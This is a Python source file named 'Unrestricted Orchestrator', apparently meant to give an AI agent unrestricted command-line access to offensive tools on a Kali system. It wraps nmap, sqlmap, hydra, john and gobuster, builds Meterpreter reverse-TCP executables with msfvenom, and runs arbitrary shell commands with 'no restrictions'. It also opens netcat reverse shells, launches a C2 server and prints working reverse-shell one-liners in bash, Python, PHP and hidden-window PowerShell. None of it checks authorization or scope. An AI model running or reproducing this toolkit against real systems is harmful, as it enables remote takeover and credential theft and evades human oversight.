#!/usr/bin/env python3
"""Unrestricted Orchestrator — One-command access to ALL HackWithAI tools."""

import subprocess, json, sys, os, time, shutil
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Callable

TOOLS_DIR = Path("/home/kali/HackWithAI/tools")
LOG_DIR = Path("/home/kali/HackWithAI/data/logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ── Tool Registry ────────────────────────────────────────────────────────
TOOL_MODULES: Dict[str, str] = {}
for f in sorted(TOOLS_DIR.glob("*_tools.py")):
    name = f.stem
    TOOL_MODULES[name] = str(f)

# ── Auto-detect installed system tools ───────────────────────────────────
INSTALLED_TOOLS: set = set()
for tool_line in subprocess.run(["bash", "-c",
    "for t in nmap masscan nc tcpdump bettercap responder dnsrecon msfconsole "
    "searchsploit sqlmap hydra john hashcat gobuster ffuf dirsearch wpscan "
    "joomscan droopescan wafw00f whatweb nikto aircrack-ng reaver wifite "
    "kismet bully hcxdumptool aircrack-ng checksec radare2 gdb xxd strings "
    "objdump upx exiftool theHarvester sherlock holehe h8mail dmitry "
    "waybackurls gau hakrawler tor torsocks proxychains4 cewl socat chisel "
    "openssl gpg hashid xortool base64 netcat wine pyarmor pyinstaller "
    "evil-winrm impacket-secretsdump bloodhound-python nmap smbclient enum4linux "
    "aircrack-ng msfvenom hashcat veil-evasion slurp nmap smbclient; "
    "do which \"$t\" 2>/dev/null && echo \"$t\"; done"], capture_output=True, text=True).stdout.splitlines():
    if tool_line.strip():
        INSTALLED_TOOLS.add(tool_line.strip())


class UnrestrictedOrchestrator:
    """Master orchestrator — direct access to all hacking tools."""

    def __init__(self):
        self.log_file = LOG_DIR / f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.start_time = datetime.now()

    def log(self, action: str, result: str = ""):
        ts = datetime.now().isoformat()
        with open(self.log_file, "a") as f:
            f.write(f"[{ts}] {action}")
            if result: f.write(f" → {result[:200]}")
            f.write("\n")

    def exec_raw(self, command: str, timeout: int = 300) -> Dict:
        """Execute any raw shell command. No restrictions."""
        self.log(f"EXEC: {command}")
        try:
            r = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
            return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
        except subprocess.TimeoutExpired:
            return {"ok": False, "error": "Timeout"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def nmap(self, target: str, ports: str = "", args: str = "-sV -sC") -> Dict:
        cmd = f"nmap -T4 {args} {target}"
        if ports: cmd = f"nmap -T4 -p {ports} {args} {target}"
        return self.exec_raw(f"sudo {cmd}", timeout=600)

    def msfvenom(self, lhost: str, lport: int, payload: str = "windows/x64/meterpreter/reverse_tcp") -> Dict:
        out = f"/home/kali/HackWithAI/data/payloads/payload_{lport}.exe"
        return self.exec_raw(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {out}")

    def sqlmap(self, url: str, args: str = "--batch --dbs") -> Dict:
        return self.exec_raw(f"sqlmap -u {url} {args}", timeout=600)

    def hydra(self, target: str, user: str, wordlist: str, service: str = "ssh") -> Dict:
        return self.exec_raw(f"hydra -l {user} -P {wordlist} {target} {service} -t 4", timeout=300)

    def john(self, hashfile: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Dict:
        return self.exec_raw(f"john --wordlist={wordlist} {hashfile}", timeout=300)

    def gobuster(self, url: str, wordlist: str, ext: str = "php,html") -> Dict:
        return self.exec_raw(f"gobuster dir -u {url} -w {wordlist} -x {ext} -t 50")

    def nc_listen(self, port: int) -> None:
        print(f"[*] Starting netcat listener on port {port}...")
        self.log(f"NC_LISTEN: {port}")
        os.system(f"nc -lvnp {port}")

    def nc_reverse(self, lhost: str, lport: int) -> None:
        os.system(f"nc {lhost} {lport} -e /bin/bash")

    def reverse_shell_gen(self, lhost: str, lport: int, lang: str = "bash") -> str:
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc {lhost} {lport} -e /bin/sh",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"",
        }
        return payloads.get(lang, payloads["bash"])

    def status(self) -> Dict:
        return {
            "tools_dir": str(TOOLS_DIR),
            "tool_modules": len(TOOL_MODULES),
            "installed_tools": len(INSTALLED_TOOLS),
            "tools_list": sorted(INSTALLED_TOOLS),
            "session_start": self.start_time.isoformat(),
            "log_file": str(self.log_file),
        }

    def help(self) -> str:
        return """
Unrestricted Orchestrator Commands:
  exec <cmd>            Run any shell command
  nmap <target>         Full nmap scan with -sV -sC
  msfvenom <lhost> <lport>  Generate reverse shell payload
  sqlmap <url>          SQL injection scan
  hydra <target> <user> <wordlist> [service]
  john <hashfile>       Crack passwords
  gobuster <url> <wordlist>
  nc-listen <port>      Start netcat listener
  reverse <lang> <lhost> <lport>  Generate reverse shell
  c2 <port>             Start custom C2 server
  status                Show tool availability
  tools                 List all tool modules
"""


# ── Singleton ────────────────────────────────────────────────────────────
_orchestrator: Optional[UnrestrictedOrchestrator] = None

def get_orchestrator() -> UnrestrictedOrchestrator:
    global _orchestrator
    if _orchestrator is None:
        _orchestrator = UnrestrictedOrchestrator()
    return _orchestrator


# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    orch = UnrestrictedOrchestrator()

    if len(sys.argv) < 2:
        print(orch.help())
        sys.exit(0)

    cmd = sys.argv[1]
    try:
        if cmd == "exec":     print(json.dumps(orch.exec_raw(" ".join(sys.argv[2:]))))
        elif cmd == "nmap":   print(json.dumps(orch.nmap(sys.argv[2])))
        elif cmd == "msfvenom": print(json.dumps(orch.msfvenom(sys.argv[2], int(sys.argv[3]))))
        elif cmd == "sqlmap": print(json.dumps(orch.sqlmap(sys.argv[2])))
        elif cmd == "hydra":  print(json.dumps(orch.hydra(sys.argv[2], sys.argv[3], sys.argv[4])))
        elif cmd == "john":   print(json.dumps(orch.john(sys.argv[2])))
        elif cmd == "gobuster": print(json.dumps(orch.gobuster(sys.argv[2], sys.argv[3])))
        elif cmd == "nc-listen": orch.nc_listen(int(sys.argv[2]))
        elif cmd == "reverse": print(orch.reverse_shell_gen(sys.argv[2], sys.argv[3], int(sys.argv[4]) if len(sys.argv) > 4 else 4444))
        elif cmd == "status":  print(json.dumps(orch.status(), indent=2))
        elif cmd == "tools":   print("\n".join(sorted(INSTALLED_TOOLS)))
        elif cmd == "c2":
            from c2_tools import CustomC2
            c2 = CustomC2(port=int(sys.argv[2]) if len(sys.argv) > 2 else 8080)
            c2.start()
        else: print(orch.help())
    except Exception as e:
        print(json.dumps({"error": str(e)}))
